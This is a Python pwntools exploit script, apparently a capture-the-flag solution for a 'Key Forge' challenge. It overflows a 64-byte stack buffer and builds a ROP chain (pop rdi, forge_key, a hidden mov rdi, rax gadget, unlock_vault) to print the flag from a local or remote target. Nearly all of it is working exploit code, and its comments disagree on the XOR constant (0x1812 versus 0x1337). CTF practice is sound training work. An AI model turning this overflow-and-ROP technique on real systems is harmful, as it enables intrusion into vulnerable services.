#!/usr/bin/env python3
"""
Key Forge — pwntools exploit
ROP chain:
  1. pop rdi ; ret         — load 0xcafebabe into RDI
  2. forge_key()           — returns global_secret ^ 0x1812 in RAX
  3. mov rdi, rax ; ret    — move RAX → RDI  (hidden gadget)
  4. unlock_vault()        — prints decrypted flag
"""
from pwn import *

# ─── configuration ─────────────────────────────────────────────────────────────
BINARY  = "./vuln"
HOST    = "challenges.cyberguardiansensate.com"
PORT    = 10103

elf = context.binary = ELF(BINARY)
context.log_level = "info"

# ─── connect ───────────────────────────────────────────────────────────────────
if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = process(BINARY)

# ─── find gadgets ──────────────────────────────────────────────────────────────
rop = ROP(elf)

# Standard pop rdi ; ret  (from any libc-style gadget search, no PIE so fixed)
# Search raw bytes: 5f (pop rdi)  c3 (ret)
pop_rdi = next(elf.search(b"\x5f\xc3"))


log.info(f"pop rdi ; ret  @ {hex(pop_rdi)}")

# Hidden gadget: mov rdi, rax ; ret  — placed in .text.gadgets
# pwntools search for the raw bytes: 48 89 c7 c3
gadget_bytes = b"\x48\x89\xc7\xc3"   # mov rdi, rax ; ret
mov_rdi_rax = next(elf.search(gadget_bytes))
log.info(f"mov rdi, rax ; ret  @ {hex(mov_rdi_rax)}")

# Function addresses (no PIE → fixed)
forge_key    = elf.sym["forge_key"]
unlock_vault = elf.sym["unlock_vault"]
log.info(f"forge_key    @ {hex(forge_key)}")
log.info(f"unlock_vault @ {hex(unlock_vault)}")

# ─── build ROP payload ────────────────────────────────────────────────────────
# Stack layout after the saved RBP:
#
#   [ pop rdi ; ret  ]   ← first gadget
#   [ 0xcafebabe     ]   ← magic word → RDI
#   [ forge_key()    ]   ← call; returns (global_secret ^ 0x1337) in RAX
#   [ mov rdi, rax   ]   ← RAX → RDI
#   [ unlock_vault() ]   ← call with correct key in RDI

MAGIC = 0xcafebabe

# Padding: 64-byte local buf + 8-byte saved RBP
padding = b"A" * 64 + b"B" * 8

chain = flat(
    pop_rdi,
    MAGIC,
    forge_key,
    mov_rdi_rax,
    unlock_vault,
)

payload = padding + chain

# ─── send & receive ───────────────────────────────────────────────────────────
io.recvuntil(b"Input: ")
io.send(payload)
flag = io.recvall(timeout=3)
log.success(f"Flag: {flag.decode(errors='replace').strip()}")
